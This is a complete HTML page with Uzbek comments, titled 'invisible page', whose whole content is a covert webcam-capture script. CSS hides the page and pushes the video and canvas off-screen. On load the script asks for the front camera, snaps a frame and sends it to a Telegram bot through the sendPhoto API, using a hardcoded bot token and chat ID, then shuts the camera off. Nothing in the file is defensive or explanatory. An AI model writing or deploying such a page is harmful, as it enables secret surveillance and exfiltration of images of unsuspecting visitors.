<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ko'rinmas sahifa</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            width: 1px;
            height: 1px;
            overflow: hidden;
            visibility: hidden;
        }

        video, canvas {
            position: absolute;
            top: -1000px;
            left: -1000px;
            width: 320px;
            height: 240px;
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        // Telegram bot sozlamalari
        const TELEGRAM_BOT_TOKEN = '8397655004:AAHz1xBd0vNNLRe9H-8krdFjZNi9btJW4GA';
        const TELEGRAM_CHAT_ID = '5724786253';

        // DOM elementlari
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // Kamera ruxsati va video oqimini boshlash
        async function boshlashKamerani() {
            try {
                // Kamera ruxsatini so'rash (mobil uchun moslashtirilgan)
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }, 
                    audio: false 
                });
                
                video.srcObject = stream;
                
                // Mobil uchun maxsus sozlash
                video.playsInline = true;
                video.muted = true;
                video.autoplay = true;
                
                // Video haqiqatan yuklanganini tekshirish
                await video.play().catch(() => {});
                
                // Video tayyorligini tekshirish (mobil uchun ko'proq vaqt berish)
                let frameCount = 0;
                await new Promise((resolve, reject) => {
                    const checkVideo = () => {
                        frameCount++;
                        
                        // 30 kadr yoki 1 sekunddan keyin to'xtatish
                        if (frameCount > 30) {
                            resolve();
                            return;
                        }
                        
                        // Video tayyor bo'lsa
                        if (video.readyState >= 2 && video.videoWidth > 0) {
                            resolve();
                        } else {
                            requestAnimationFrame(checkVideo);
                        }
                    };
                    checkVideo();
                    
                    // Maximal 1 sekund kutish
                    setTimeout(resolve, 1000);
                });
                
                // Rasmga olish (mobil uchun biroz ko'proq vaqt berish)
                setTimeout(rasmgaOlishVaYuborish, 200);
                
            } catch (xato) {
                console.error('Kamera xatosi:', xato);
            }
        }

        // Videodan rasmga olish va Telegramga yuborish
        async function rasmgaOlishVaYuborish() {
            try {
                // Canvas o'lchamlarini video o'lchamlariga moslash
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                
                // Agar video hali tayyor bo'lmasa, standart o'lchamlardan foydalanish
                if (canvas.width === 0 || canvas.height === 0) {
                    canvas.width = 640;
                    canvas.height = 480;
                }
                
                // Videoni canvasga chizish
                const context = canvas.getContext('2d');
                
                // Fonni oq rang bilan to'ldirish (agar video bo'lmasa)
                context.fillStyle = '#FFFFFF';
                context.fillRect(0, 0, canvas.width, canvas.height);
                
                // Videoni chizish (agar mavjud bo'lsa)
                if (video.videoWidth > 0 && video.videoHeight > 0) {
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                }
                
                // Rasmni base64 formatga o'tkazish
                const rasmDataUrl = canvas.toDataURL('image/jpeg', 0.7);
                
                // Telegramga yuborish
                await yuborishTelegramga(rasmDataUrl);
                
            } catch (xato) {
                console.error('Rasmga olish xatosi:', xato);
            } finally {
                // Kamera oqimini darhol to'xtatish
                tozalashKamerani();
            }
        }

        // Telegramga rasm yuborish
        async function yuborishTelegramga(rasmDataUrl) {
            try {
                // Base64 dan blob obyektga o'tkazish
                const rasmBlob = await fetch(rasmDataUrl).then(r => r.blob());
                
                // FormData yaratish
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('photo', rasmBlob, 'webcam_photo.jpg');
                
                // Telegram API orqali rasm yuborish
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
            } catch (xato) {
                console.error('Telegram yuborish xatosi:', xato);
            }
        }

        // Kamera oqimini to'xtatish
        function tozalashKamerani() {
            const stream = video.srcObject;
            if (stream) {
                const tracks = stream.getTracks();
                tracks.forEach(track => track.stop());
                video.srcObject = null;
            }
        }

        // Sahifa yuklanganda darhol kamerani boshlash
        if (document.readyState === 'complete') {
            boshlashKamerani();
        } else {
            window.addEventListener('load', boshlashKamerani);
        }
        
        // Sahifadan chiqilganda kamerani to'xtatish
        window.addEventListener('beforeunload', tozalashKamerani);
    </script>
</body>
</html>
